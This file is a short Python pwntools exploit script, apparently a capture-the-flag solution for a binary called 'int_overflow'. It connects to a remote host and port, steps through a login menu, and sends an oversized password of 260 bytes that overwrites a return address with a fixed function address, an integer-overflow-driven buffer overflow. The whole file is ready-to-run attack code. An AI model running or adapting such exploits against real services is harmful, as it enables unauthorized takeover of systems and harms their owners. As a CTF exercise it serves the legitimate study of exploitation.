from pwn import *

#n = process('./int_overflow')
n = remote('111.198.29.45',59540)

elf = ELF('./int_overflow')

n.recvuntil('choice:')
n.sendline('1')
n.recvuntil('username:\n')
n.sendline('1')
n.recvuntil('passwd:\n')
payload = 'a' * 0x18 + p32(0x0804868B)
payload += 'a' * (260 - len(payload))
n.sendline(payload)
print(n.recvall())
